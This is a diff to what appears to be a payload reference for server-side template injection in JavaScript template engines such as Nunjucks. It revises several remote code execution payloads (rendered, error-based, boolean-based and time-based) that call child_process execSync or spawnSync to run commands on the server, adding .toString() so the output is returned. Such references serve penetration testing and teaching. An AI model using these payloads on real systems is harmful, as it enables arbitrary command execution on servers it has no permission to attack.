@@ -41,17 +41,17 @@ To use these payloads, wrap them in the appropriate tag.
 
 ```javascript
 // Rendered RCE
-global.process.mainModule.require("child_process").execSync("id")
+global.process.mainModule.require("child_process").execSync("id").toString()
 
 // Error-Based RCE
-global.process.mainModule.require("Y:/A:/"+global.process.mainModule.require("child_process").execSync("id"))
-""["x"][global.process.mainModule.require("child_process").execSync("id")]
+global.process.mainModule.require("Y:/A:/"+global.process.mainModule.require("child_process").execSync("id").toString())
+""["x"][global.process.mainModule.require("child_process").execSync("id").toString()]
 
 // Boolean-Based RCE
 [""][0 + !(global.process.mainModule.require("child_process").spawnSync("id", options={shell:true}).status===0)]["length"]
 
 // Time-Based RCE
-global.process.mainModule.require("child_process").execSync("id && sleep 5")
+global.process.mainModule.require("child_process").execSync("id && sleep 5").toString()
 ```
 
 NunjucksJS is also capable of executing these payloads using `{{range.constructor(' ... ')()}}`.
